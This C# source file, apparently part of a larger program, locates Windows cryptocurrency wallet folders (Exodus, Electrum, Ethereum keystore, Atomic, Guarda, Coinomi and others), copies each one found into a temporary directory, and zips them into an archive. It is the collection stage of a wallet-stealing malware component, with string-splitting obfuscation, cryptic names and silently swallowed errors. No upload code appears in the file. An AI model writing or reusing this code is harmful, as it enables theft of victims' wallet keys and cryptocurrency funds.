using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.IO.Compression;

namespace H.DV
{
    internal static class K
    {
        private static readonly Dictionary<string, string> _wp;

        static K()
        {
            var a = Environment.GetEnvironmentVariable("app" + "data");
            var b = Environment.GetEnvironmentVariable("local" + "appdata");

            _wp = new Dictionary<string, string>()
            {
                { "Z", Path.Combine(a, "Z" + "cash") },
                { "A", Path.Combine(a, "A" + "rmory") },
                { "B", Path.Combine(a, "B" + "ytecoin") },
                { "J", Path.Combine(b, string.Join("", "com".ToCharArray()) + ".liberty.jaxx", "Indexed" + "DB", "file_0.indexeddb.leveldb") },
                { "E", Path.Combine(a, "Exodus", "exodus.wallet") },
                { "ET", Path.Combine(a, "Ethereum", "keystore") },
                { "EL", Path.Combine(a, "Electrum", "wallets") },
                { "AW", Path.Combine(a, "atomic", "Local Storage", "leveldb") },
                { "G", Path.Combine(a, "Guarda", "Local Storage", "leveldb") },
                { "C", Path.Combine(b, "Coinomi", "Coinomi", "wallets") },
            };
        }

        internal static async Task<int> A(string t)
        {
            var c = 0;

            foreach (var i in _wp)
            {
                if (Directory.Exists(i.Value))
                {
                    DirectoryInfo d = null;
                    var p = Path.Combine(t, i.Key);
                    try
                    {
                        d = Directory.CreateDirectory(p);
                        CD(i.Value, p);

                        var txt = "Sour" + "ce: " + i.Value;
                        var bts = System.Text.Encoding.UTF8.GetBytes(txt);

                        var f = Path.Combine(p, "S" + "rc.txt");
                        using (var fs = new FileStream(f, FileMode.Create, FileAccess.Write, FileShare.Read))
                        {
                            await fs.WriteAsync(bts, 0, bts.Length);
                        }

                        c++;
                    }
                    catch { try { d?.Delete(true); } catch { } }
                }
            }

            return c;
        }

        internal static async Task<string> B()
        {
            var tf = Path.Combine(Path.GetTempPath(), "WL_" + Guid.NewGuid().ToString());
            string z = null;
            bool s = false;

            try
            {
                Directory.CreateDirectory(tf);
                int n = await A(tf);

                if (n > 0)
                {
                    z = tf + ".zip";
                    ZipFile.CreateFromDirectory(tf, z);
                    s = true;
                }
            }
            catch { }
            finally
            {
                if (Directory.Exists(tf))
                {
                    try { Directory.Delete(tf, true); } catch { }
                }
            }

            return s ? z : null;
        }

        private static void CD(string s, string t)
        {
            foreach (string d in Directory.GetDirectories(s, "*", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(d.Replace(s, t));
            }

            foreach (string f in Directory.GetFiles(s, "*.*", SearchOption.AllDirectories))
            {
                File.Copy(f, f.Replace(s, t), true);
            }
        }
    }
}
